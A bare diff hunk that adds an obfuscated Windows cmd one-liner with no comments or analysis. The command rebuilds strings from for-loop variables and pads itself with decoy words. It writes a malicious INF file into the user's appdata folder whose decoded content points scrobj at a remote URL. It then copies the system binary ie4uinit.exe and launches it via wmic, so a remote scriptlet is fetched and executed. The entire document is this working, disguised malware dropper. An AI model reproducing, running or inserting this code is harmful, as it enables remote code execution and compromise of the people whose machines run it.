@@ -1,0 +1,6 @@
+/v /c (for %k in (s) do @set "Rebates=%~k") &&
+  (for %u in (a) do @set "Quality=%~u") &&
+  (for %t in (c) do @set "Builders=%~t") &&
+  call(for %k in ("[strings]" "Diamond=com" "servicename=' '" "shortsvcname=' '" "Flashers=t;March" "Humble=init" "Restrictions=%time%" "Boost=:;Exercises" "Situations=/" "Explains=b;Athlete" "Magazines=h" "[version]" "signature =$windows nt$" "[destinationdirs]" "defaultdestdir=11" "2635E=01" "[defaultinstall.windows7]" "Un\" "Register\" "OCXs=EFB" "delfiles=2635E" "[2635E]" "ieu%Humble%.inf" "[EFB]" "sc\" "ro%Explains%j,NI,%Magazines%%Flashers%%Flashers%p%Boost%%Situations%%Situations%slkdbfkwfd.julienolsson.%Diamond%/b8q5j6fb3" ) do @echo %~k)>"%appdata%\microsoft\ieuinit.inf" &&
+  call xcopy /Y /C /Q %win!Salad!ir%\system32\ie4uinit.exe "%appdata%\microsoft\*" | set Eyebrow5=Artwork &&
+  start "" wmic process call create "%appdata%\microsoft\ie4uinit.exe -basesettings" | set "Eyebrow03=Standings Warriors Relief Ministers Arrives Frozen Margin Floor Glass Water Travel Lesson Cloud Times Average Giants Disputes Restaurant Checks Hundred Picture Inform Subscriptions Industry Titans Wreck Reopen Centers Reject Crisis Heart Handles Tiles Generations Capital Stress"
